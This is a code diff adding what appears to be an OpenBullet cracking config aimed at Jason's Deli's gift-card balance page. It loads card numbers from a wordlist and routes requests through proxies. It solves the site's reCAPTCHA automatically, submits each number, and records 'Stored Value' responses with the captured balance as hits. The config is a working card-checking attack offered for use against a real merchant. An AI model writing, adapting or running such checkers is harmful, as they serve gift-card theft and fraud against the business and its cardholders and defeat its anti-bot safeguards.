@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "jasonsdeli",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-22T17:47:56.9622572+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje [ KEEPIT.ONLINE ]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_REQUEST REQUEST GET "https://jasonsdeli.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: JSESSIONID=OqEdKdaoCEzQAcaoAjKXkjqemRv3sT6228lo4cr2.px-web-jsp; __cfduid=d874765e7ac5005aac4923176147d45d01529438238; __cflb=3949864247; pxCookie=Y" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Please complete the security check to access" 
+RECAPTCHA "https://jasonsdeli.myguestaccount.com/guest/nologin/account-balance" "6LdndBYUAAAAAIE_sQA2y29GSRaKJHKx2DodPT6m" -> VAR "RECAPTCHA" 
+PARSE "<SOURCE>" LR "<form method=\"post\" action=\"/guest/nologin/account-balance\" role=\"form\" class=\"form-horizontal\"><input value=\"true\" type=\"hidden\" name=\"" "\"" Recursive=FALSE -> VAR "RANDOMTOKEN" "" "" 
+PARSE "<SOURCE>" LR "<button class=\"btn btn-default nologinCardnumberSubmitButton\" name=\"" "\"" Recursive=FALSE -> VAR "SUBMIT" "" "" 
+#POST_REQUEST REQUEST POST "https://jasonsdeli.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "<RANDOMTOKEN>=true&cardnum=<USER>&g-recaptcha-response=<RECAPTCHA>&<SUBMIT>=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://jasonsdeli.myguestaccount.com/guest/nologin/account-balance" 
+  HEADER "origin: https://jasonsdeli.myguestaccount.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Retry OR 
+  KEYCHAIN Failure OR 
+    KEY "Invalid" 
+  KEYCHAIN Success OR 
+    KEY "Stored Value" 
+PARSE "<SOURCE>" LR "<div class=\"col-md-2\">$" " " Recursive=FALSE -> CAP "Balance" "$" "" 
